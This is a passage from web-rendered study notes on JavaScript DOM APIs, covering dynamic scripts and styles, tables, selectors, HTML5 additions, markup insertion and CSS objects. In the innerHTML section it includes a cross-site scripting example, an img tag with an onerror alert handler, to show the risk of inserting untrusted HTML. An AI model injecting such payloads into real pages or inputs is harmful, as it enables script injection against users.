    newScript<span class="token punctuation">.</span>onerror <span class="token operator">=</span> loadError<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>onloadFunction<span class="token punctuation">)</span> <span class="token punctuation">{</span> newScript<span class="token punctuation">.</span>onload <span class="token operator">=</span> onloadFunction<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    document<span class="token punctuation">.</span>currentScript<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>newScript<span class="token punctuation">,</span> document<span class="token punctuation">.</span>currentScript<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// document.head.appendChild(newScript);</span>
    newScript<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul></li> <li><p>Dynamic Styles</p> <ul><li><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt;</code><div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> link <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;link&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
link<span class="token punctuation">.</span>rel <span class="token operator">=</span> <span class="token string">&quot;stylesheet&quot;</span><span class="token punctuation">;</span>
link<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">&quot;text/css&quot;</span><span class="token punctuation">;</span>
link<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">&quot;styles.css&quot;</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li> <li>the <code>&lt;style&gt;</code> element<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> style <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;style&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
style<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">&quot;text / css&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
    style<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">&quot;body{ background-color: red }&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    style<span class="token punctuation">.</span>styleSheet<span class="token punctuation">.</span>cssText <span class="token operator">=</span> <span class="token string">&quot;body{ background - color: red } &quot;</span><span class="token punctuation">;</span>
    <span class="token comment">// only IE</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> head <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&quot;head&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li><code>CSSStyleSheet.insertRule()</code></li> <li><code>CSSStyleSheet.deleteRule()</code></li></ul></li></ul></li> <li><p>Manipulating Tables</p> <ul><li><code>HTMLTableElement</code>: <code>&lt;table&gt;</code> <ul><li><code>caption</code> — Pointer to the <code>&lt;caption&gt;</code> element (if it exists)</li> <li><code>tBodies</code> — An HTMLCollection of <code>&lt;tbody&gt;</code> elements</li> <li><code>tFoot</code> — Pointer to the <code>&lt;tfoot&gt;</code> element (if it exists)</li> <li><code>tHead</code> — Pointer to the <code>&lt;thead&gt;</code> element (if it exists)</li> <li><code>rows</code> — An HTMLCollection of all rows in the table</li> <li><code>createTHead()</code> — Creates a <code>&lt;thead&gt;</code> element, places it into the table, and returns a reference</li> <li><code>createTFoot()</code> — Creates a <code>&lt;tfoot&gt;</code> element, places it into the table, and returns a reference</li> <li><code>createCaption()</code> — Creates a <code>&lt;caption&gt;</code> element, places it into the table, and returns a reference</li> <li><code>deleteTHead()</code> — Deletes the <code>&lt;thead&gt;</code> element</li> <li><code>deleteTFoot()</code> — Deletes the <code>&lt;tfoot&gt;</code> element</li> <li><code>deleteCaption()</code> — Deletes the <code>&lt;caption&gt;</code> element</li> <li><code>deleteRow(pos)</code> — Deletes the row in the given position</li> <li><code>insertRow(pos)</code> — Inserts a row in the given position in the rows collection</li></ul></li> <li><code>HTMLTableSectionElement</code>: <code>&lt;tbody&gt;</code> <ul><li><code>rows</code> — An HTMLCollection of rows in the <code>&lt;tbody&gt;</code> element</li> <li><code>deleteRow(pos)</code> — Deletes the row in the given position</li> <li><code>insertRow(pos)</code> — Inserts a row in the given position in the rows collection and returns a reference to the new row</li></ul></li> <li><code>HTMLTableRowElement</code>: <code>&lt;tr&gt;</code> <ul><li><code>cells</code> — An HTMLCollection of cells in the <code>&lt;tr&gt;</code> element</li> <li><code>deleteCell(pos)</code> — Deletes the cell in the given position</li> <li><code>insertCell(pos)</code> — Inserts a cell in the given position in the <code>cells</code> collection and returns a reference to the new cell</li></ul></li></ul></li></ol> <h3 id="dom-extensions"><a href="#dom-extensions" class="header-anchor">#</a> DOM Extensions</h3> <h4 id="selectors-api"><a href="#selectors-api" class="header-anchor">#</a> Selectors API</h4> <ol><li><p>the library <a href="www.jquery.com">jQuery</a></p> <ul><li>built completely around the CSS selector queries of a DOM document</li> <li><code>$(this)</code></li> <li><code>$(#id)</code></li> <li><code>$(.class)</code></li> <li><code>$(tag)</code></li></ul></li> <li><p><a href="www.w3.org/TR/selectors-api">The Selectors API</a> was started by the W3C to specify native support for CSS queries in browsers</p> <ul><li>less compatible than jQuery and DOM Level 1 methods</li></ul></li> <li><p>The Selectors API Level 1</p> <ul><li><code>document.querySelector(selectors): HTMLTagNameMap</code> method
<ul><li>any valid CSS query</li> <li>The matching is done using depth-first pre-order traversal of the document's nodes starting with the first element in the document's markup and iterating through sequential nodes by order of the number of child nodes</li></ul></li> <li><code>document.querySelectorAll(selectors): NodeList</code> method</li></ul></li> <li><p>The Selectors API Level 2</p> <ul><li><code>Element.matches(selectors): boolean</code> <ul><li>returns <code>true</code> if the given element matches the selector or <code>false</code> if not</li></ul></li></ul></li></ol> <h4 id="element-traversal"><a href="#element-traversal" class="header-anchor">#</a> Element Traversal</h4> <ol><li><p><a href="/notes-of-tan/www.w3.org/TR/ElementTraversal/">Element Traversal</a></p> <ul><li>effort to equalize the differences while still remaining true to the DOM specification
<ul><li>IE9 and earlier did not return text nodes for white space in between elements</li> <li>implemented in Internet Explorer 9+, Firefox 3.5+, Safari 4+, Chrome, and Opera 10+</li></ul></li> <li><code>childElementCount</code> — Returns the number of child elements (excludes text nodes and comments)</li> <li><code>firstElementChild</code> — Points to the first child that is an element. Element-only version of <code>firstChild</code></li> <li><code>lastElementChild</code> — Points to the last child that is an element. Element-only version of <code>lastChild</code></li> <li><code>previousElementSibling</code> — Points to the previous sibling that is an element. Element-only version of <code>previousSibling</code></li> <li><code>nextElementSibling</code> — Points to the next sibling that is an element. Element-only version of <code>nextSibling</code></li></ul></li> <li><p><code>ParentNode.children: HTMLCollection</code></p> <ul><li>a read-only property that returns a live <code>HTMLCollection</code> which contains all of the child elements of the node</li></ul></li></ol> <h4 id="html5"><a href="#html5" class="header-anchor">#</a> HTML5</h4> <p>The HTML5 specification, on the other hand, contains a large amount of JavaScript APIs designed for use with the markup additions.</p> <ol><li><p>Class-Related Additions</p> <ul><li>The <code>getElementsByClassName(classNames): HTMLCollection</code> Method
<ul><li>call on <code>document</code> or <code>Element</code></li> <li>implemented in Internet Explorer 9+, Firefox 3+, Safari 3.1+, Chrome, and Opera 9.5+</li></ul></li> <li>The <code>Element.classList: DOMTokenList</code> Property
<ul><li><code>className</code> inconvenient for multiple classes<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>bd user disabled<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li><code>length</code> property, <code>item(index): string</code> method or using bracket notation</li> <li><code>add(value)</code> — Adds the given string value to the list. If the value already exists, it will not be added</li> <li><code>contains(value)</code> — Indicates if the given value exists in the list ( <code>true</code> if so; <code>false</code> if not)</li> <li><code>remove(value)</code> — Removes the given string value from the list</li> <li><code>toggle(value)</code> — If the value already exists in the list, it is removed. If the value doesn’t exist, then it’s added</li></ul></li></ul></li> <li><p>Focus Management</p> <ul><li>focus: An element can receive focus
<ul><li>determine if the user is interacting with the page</li> <li>automatically as the page is loading</li> <li>via user input (typically using the Tab key)</li> <li>or programmatically using the <code>focus()</code> method</li></ul></li> <li><code>document.activeElement</code>: get the element that has the focus when the parent document has focus
<ul><li>by default, set to <code>document.body</code> when the document is first loaded</li> <li>Before the document is fully loaded, it is <code>null</code></li></ul></li> <li><code>document.hasFocus()</code>: a Boolean value indicating if the document has focus</li></ul></li> <li><p>Changes to HTMLDocument</p> <ul><li><code>document.readyState</code> returns
<ul><li><code>loading</code> — The document is loading</li> <li><code>interactive</code> — The document has finished loading and the document has been parsed but sub-resources such as images, stylesheets and frames are still loading
<ul><li>IE10 and earlier have quirks</li></ul></li> <li><code>complete</code> — The document is completely loaded
<ul><li>The state indicates that the <code>load</code> event is about to fire</li></ul></li> <li>When the value of this property changes a <code>readystatechange</code> event fires on the <code>document</code> object</li> <li>Before this property was widely available, you would need to add an <code>onload</code> event handler to set a flag indicating that the document was loaded</li></ul></li></ul></li> <li><p>Compatibility Mode — <code>document.compatMode</code></p> <ul><li>when in standards mode, <code>document.compatMode</code> is equal to <code>&quot;CSS1Compat&quot;</code></li> <li>when in quirks mode, <code>document.compatMode</code> is <code>&quot;BackCompat&quot;</code></li></ul></li> <li><p>The head Property — <code>document.head</code></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> head <span class="token operator">=</span> document<span class="token punctuation">.</span>head <span class="token operator">||</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&quot;head&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre></div></li> <li><p>Character Set Properties — <code>document.characterSet</code></p> <ul><li>By default, this value is <code>&quot;UTF-16&quot;</code></li> <li>may be changed by using <code>&lt;meta&gt;</code> elements or response headers</li> <li>can be directly set</li></ul></li> <li><p>Custom Data Attributes</p> <ul><li>in HTML5, nonstandard attributes prefixed with <code>data-</code> in order to provide information that isn’t necessary to the rendering or semantic value of the element</li> <li>access custom data attributes: <code>HTMLElement.dataset: DOMStringMap</code> <ul><li>name conversation: dash-style to camelCase
<ul><li>the prefix <code>data-</code> is removed (including the dash);</li> <li>for any dash (<code>U+002D</code>) followed by an ASCII lowercase letter a to z, the dash is removed and the letter is transformed into its uppercase counterpart;</li> <li>other characters (including other dashes) are left unchanged</li></ul></li> <li>For example, the attribute named <code>data-abc-def</code> corresponds to the key <code>abcDef</code></li></ul></li></ul></li> <li><p>Markup Insertion</p> <ul><li><code>Element.innerHTML</code>: returns the HTML representing all of the child nodes
<ul><li>can be set</li> <li><code>DocumentFragment</code> is created behind the scenes when set</li> <li><code>&lt;script&gt;</code> elements cannot be executed when inserted
<ul><li>However, there are ways to execute JavaScript without using <code>&lt;script&gt;</code> elements<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">&quot;&lt;img src='x' onerror='alert(1)'&gt;&quot;</span><span class="token punctuation">;</span>
el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> name<span class="token punctuation">;</span> <span class="token comment">// shows the alert</span>
</code></pre></div></li></ul></li> <li>for safety, use <code>Node.textContent</code> instead when inserting plain text
<ul><li><code>Node.innerText</code> is a somewhat similar alternative, although there are important differences between the two</li></ul></li></ul></li> <li><code>Element.outerHTML</code>: <code>innerHTML</code> with the node being called</li> <li><code>Element.insertAdjacentHTML(where: InsertPosition, html: string): void</code> <ul><li>where: <code>'beforebegin'</code>, <code>'afterbegin'</code>, <code>'beforeend'</code>, <code>'afterend'</code><div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- beforebegin --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!-- afterbegin --&gt;</span>
    foo
    <span class="token comment">&lt;!-- beforeend --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- afterend --&gt;</span>
</code></pre></div></li></ul></li> <li><code>Element.insertAdjacentElement(position: InsertPosition, insertedElement: Element): Element</code></li> <li><code>Element.insertAdjacentText(where: InsertPosition, text: string): void</code></li> <li>performance: limit the number of times of use, best to build up the cache separately and assign to those above</li> <li><code>Node.innerText: string</code> <ul><li>the &quot;rendered&quot; text content of a node and its descendants</li> <li>Can be set, to replace the element's children with the given value, but with line breaks converted to <code>&lt;br&gt;</code> elements</li> <li>useful for stripping out HTML tags<div class="language-javascript extra-class"><pre class="language-javascript"><code>div<span class="token punctuation">.</span>innerText <span class="token operator">=</span> div<span class="token punctuation">.</span>innerText<span class="token punctuation">;</span>
</code></pre></div></li></ul></li> <li><code>Node.textContent: string</code> <ul><li><code>innerText</code> without render
<ul><li>represents the text content of a node and its descendants</li> <li>including <code>&lt;script&gt;</code> and <code>&lt;style&gt;</code> elements, “hidden” elements</li></ul></li> <li>returns <code>null</code> if the node is a document, a DOCTYPE, or a notation</li> <li>If the node is a CDATA section, comment, processing instruction, or text node, textContent returns the text inside this node (the <code>nodeValue</code>)</li></ul></li></ul></li> <li><p>scroll: <code>Element.scrollIntoView(arg?: boolean | ScrollIntoViewOptions): void</code></p> <ul><li>all arguments are optional</li> <li>Note that setting focus to an element also causes the browser to scroll the element into view</li> <li>arg
<ul><li>(default) If <code>true</code>, the top of the element will be aligned to the top of the visible area of the scrollable ancestor
<ul><li>Corresponds to scrollIntoViewOptions: <code>{block: &quot;start&quot;, inline: &quot;nearest&quot;}</code></li></ul></li> <li>If <code>false</code>, the bottom of the element will be aligned to the bottom of the visible area of the scrollable ancestor
<ul><li>Corresponds to scrollIntoViewOptions: <code>{block: &quot;end&quot;, inline: &quot;nearest&quot;}</code></li></ul></li></ul></li> <li>scrollIntoViewOptions: (highly experimental) an Object with the following optional properties
<ul><li><code>behavior</code> <ul><li>Defines the transition animation.</li> <li>One of <code>&quot;auto&quot;,</code> <code>&quot;instant&quot;,</code> or <code>&quot;smooth&quot;.</code> Defaults to <code>&quot;auto&quot;</code></li></ul></li> <li><code>block</code> <ul><li>One of <code>&quot;start&quot;,</code> <code>&quot;center&quot;,</code> <code>&quot;end&quot;,</code> or <code>&quot;nearest&quot;.</code> Defaults to <code>&quot;center&quot;</code></li></ul></li> <li><code>inline</code> <ul><li>One of <code>&quot;start&quot;,</code> <code>&quot;center&quot;,</code> <code>&quot;end&quot;,</code> or <code>&quot;nearest&quot;.</code> Defaults to <code>&quot;nearest&quot;</code></li></ul></li></ul></li></ul></li></ol> <h4 id="proprietary-extensions"><a href="#proprietary-extensions" class="header-anchor">#</a> Proprietary Extensions</h4> <ol><li><p>Document Mode: IE only</p> <ul><li><code>document.documentMode</code></li> <li>force a particular document mode<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>X-UA-Compatible<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>IE=IEVersion<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li><code>IEVersion</code> <ul><li><code>Edge</code> — Always put the document into the most recent document mode available. Doctype is ignored</li> <li><code>EmulateIE9</code>, <code>EmulateIE8</code> or <code>EmulateIE7</code> — If a doctype is present, set the document mode to IE9, 8 or 7 standards and otherwise IE5 (quirks mode)</li> <li><code>9</code>, <code>8</code> or <code>7</code> — Force IE9, 8 or 7, Doctype is ignored</li> <li><code>5</code> — Force IE5 (quirks mode)</li></ul></li> <li>without the tag: By default, the browser uses the doctype to determine if the document mode should be the best available standards mode or quirks mode</li></ul></li> <li><p>Markup Insertion — <code>HTMLElement.outerText</code>: widely supported</p> <ul><li>As a getter, it returns the same value as <code>Node.innerText</code></li> <li>As a setter, it removes the current node and replaces it with the given text</li></ul></li> <li><p>Scrolling</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/scrollIntoViewIfNeeded" target="_blank" rel="noopener noreferrer"><code>Element.scrollIntoViewIfNeeded()</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/scrollByLines" target="_blank" rel="noopener noreferrer"><code>Window.scrollByLines()</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/scrollByPages" target="_blank" rel="noopener noreferrer"><code>Window.scrollByPages()</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ol> <h3 id="dom-levels-2-and-3"><a href="#dom-levels-2-and-3" class="header-anchor">#</a> DOM Levels 2 and 3</h3> <ol><li>Conformance Check: see before <code>document.implementation.hasFeature()</code></li></ol> <h4 id="xml-namespaces-rarely-used"><a href="#xml-namespaces-rarely-used" class="header-anchor">#</a> XML Namespaces (rarely used)</h4> <ol><li><p>XML Namespaces</p> <ul><li>allow elements from different XML-based languages to be mixed together</li> <li>Technically, XML namespaces are not supported by HTML but supported in XHTML</li> <li>namespaces can be nested: <code>&lt;svg&gt;</code> in XHTML</li> <li><code>xmlns</code><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xhtml<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
...
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li>a prefix for an XML namespace
<ul><li>typically, all elements are considered to be part of the XHTML namespace by default</li> <li>can explicitly create a prefix<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xhtml:</span>html</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xhtml</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xhtml<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xhtml:</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xhtml:</span>title</span><span class="token punctuation">&gt;</span></span>Example XHTML page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xhtml:</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xhtml:</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xhtml:</span>body</span><span class="token punctuation">&gt;</span></span>
    Hello world!
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xhtml:</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">xhtml:</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li>Attributes may also be namespaced<div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xhtml:</span>body</span> <span class="token attr-name"><span class="token namespace">xhtml:</span>class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>home<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li></ul></li></ul></li> <li><p>namespaces for <code>Node</code></p> <ul><li><code>localName</code> — The node name without the namespace prefix</li> <li><code>namespaceURI</code> — The namespace URI of the node or null if not specified</li> <li><code>prefix</code> — The namespace prefix or <code>null</code> if not specified</li> <li>When a node uses a namespace prefix, the nodeName is equivalent to <code>prefix + &quot;:&quot; + localName</code></li> <li><code>isDefaultNamespace(namespaceURI)</code> — Returns <code>true</code> when the specified namespaceURI is the default namespace for the node</li> <li><code>lookupNamespaceURI(prefix)</code> — Returns the namespace URI for the given prefix</li> <li><code>lookupPrefix(namespaceURI)</code> — Returns the prefix for the given namespaceURI</li></ul></li> <li><p>namespace with <code>Document</code></p> <ul><li><code>createElementNS(namespaceURI, tagName)</code> — Creates a new element with the given tagName as part of the namespace indicated by namespaceURI</li> <li><code>createAttributeNS(namespaceURI, attributeName)</code> — Creates a new attribute node as part of the namespace indicated by namespaceURI</li> <li><code>getElementsByTagNameNS(namespaceURI, tagName)</code> — Returns a <code>NodeList</code> of elements with the given tagName that are also a part of the namespace indicated by namespaceURI</li></ul></li> <li><p>namespace with <code>Element</code></p> <ul><li>These methods behave the same as their DOM Level 1 counterparts with the exception of the first argument, which is always the namespace URI except for <code>setAttributeNodeNS()</code></li> <li><code>getAttributeNS(namespaceURI, localName)</code> — Gets the attribute from the namespace represented by namespaceURI and with a name of localName</li> <li><code>getAttributeNodeNS(namespaceURI, localName)</code> — Gets the attribute node from the namespace represented by namespaceURI and with a name of localName</li> <li><code>getElementsByTagNameNS(namespaceURI, tagName)</code> — Returns a <code>NodeList</code> of descendant elements with the given tagName that are also a part of the namespace indicated by namespaceURI</li> <li><code>hasAttributeNS(namespaceURI, localName)</code> — Determines if the element has an attribute from the namespace represented by namespaceURI and with a name of localName
<ul><li>Note: DOM Level 2 Core also adds a <code>hasAttribute()</code> method for use without namespaces</li></ul></li> <li><code>removeAttributeNS(namespaceURI, localName)</code> — Removes the attribute from the namespace represented by namespaceURI and with a name of localName</li> <li><code>setAttributeNS(namespaceURI, qualifiedName, value)</code> — Sets the attribute from the namespace represented by namespaceURI and with a name of qualifiedName equal to value</li> <li><code>setAttributeNodeNS(attNode)</code> — Sets the attribute node from the namespace represented by namespaceURI</li></ul></li> <li><p>namespace with <code>NamedNodeMap</code></p> <ul><li><code>getNamedItemNS(namespaceURI, localName)</code> — Gets the item from the namespace represented by namespaceURI and with a name of localName</li> <li><code>removeNamedItemNS(namespaceURI, localName)</code> — Removes the item from the namespace represented by namespaceURI and with a name of localName</li> <li><code>setNamedItemNS(node)</code> — Adds node, which should have namespace information already applied.</li></ul></li></ol> <h4 id="other-changes"><a href="#other-changes" class="header-anchor">#</a> Other Changes</h4> <p>See before DOM Level 1.</p> <h4 id="styles"><a href="#styles" class="header-anchor">#</a> Styles</h4> <h5 id="style-global-attribute"><a href="#style-global-attribute" class="header-anchor">#</a> style Global Attribute</h5> <ol><li><p>other Global Attributes</p> <ul><li><code>id</code>, <code>lang</code>, <code>className</code> etc., see before</li> <li>event handlers</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p><code>ElementCSSInlineStyle.style: CSSStyleDeclaration</code>: global attribute</p> <ul><li>css property names: dash-case to camelCase
<ul><li><code>float</code> in CSS:
<ul><li><code>CSSStyleDeclaration.cssFloat</code></li> <li><code>CSSStyleDeclaration.styleFloat</code> for IE8 and earlier</li></ul></li></ul></li> <li>usage<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> myDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;myDiv&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//set the background color</span>
myDiv<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundColor <span class="token operator">=</span> <span class="token string">&quot;red&quot;</span><span class="token punctuation">;</span>
</code></pre></div></li> <li>other properties
<ul><li><code>cssText</code> — provides access to the CSS code of the <code>style</code> attribute</li> <li><code>length</code> (read only) — The number of CSS properties applied to the element</li> <li><code>parentRule</code> (read only) — The <code>CSSRule</code> object representing the CSS information</li></ul></li> <li>methods
<ul><li><code>getPropertyPriority(propertyName)</code> — Returns <code>&quot;important&quot;</code> if the given property is set using <code>!important</code> ; otherwise it returns an empty string</li> <li><code>getPropertyValue(propertyName)</code> — Returns the string value of the given property</li> <li><code>item(index)</code> — Returns the name of the CSS property at the given position
<ul><li>or bracket notation</li></ul></li> <li><code>removeProperty(propertyName)</code> — Removes the given property from the style
<ul><li>Simply removing the property allows the default value to be used</li></ul></li> <li><code>setProperty(propertyName, value, priority)</code> — Sets the given property to the given value with a priority (either <code>&quot;important&quot;</code> or an empty string)</li></ul></li></ul></li> <li><p>Computed Styles — <code>window.getComputedStyle(elt: Element, pseudoElt?: string): CSSStyleDeclaration</code> (read only)</p> <ul><li>also contains the styles that have cascaded</li> <li>elt: for which to get the computed style</li> <li>pseudoElt: A string specifying the pseudo-element to match. Must be omitted (or <code>null</code>) for regular elements</li> <li>not necessarily, but sometimes used after <code>document.defaultView</code> for some reason</li></ul></li></ol> <h5 id="style-sheets"><a href="#style-sheets" class="header-anchor">#</a> Style Sheets</h5> <ol><li><p>get stylesheets</p> <ul><li><code>Document.styleSheets: StyleSheetList</code>: read only</li> <li><code>LinkStyle.sheet: StyleSheet</code>: read only
<ul><li>Returns the <code>StyleSheet</code> object associated with the given element, or <code>null</code> if there is none</li> <li><code>styleSheet</code> for IE</li></ul></li></ul></li> <li><p><code>CSSStyleSheet</code></p> <ul><li>represents a CSS style sheet as included using a <code>&lt;link&gt;</code> (<code>HTMLLinkElement</code>) element or defined in a <code>&lt;style&gt;</code> (<code>HTMLStyleElement</code>) element</li> <li>inherits from <code>StyleSheet</code> , which can be used as a base to define non-CSS style sheets</li> <li>inherited properties: read only
<ul><li><code>disabled</code> — A Boolean value indicating if the style sheet is disabled
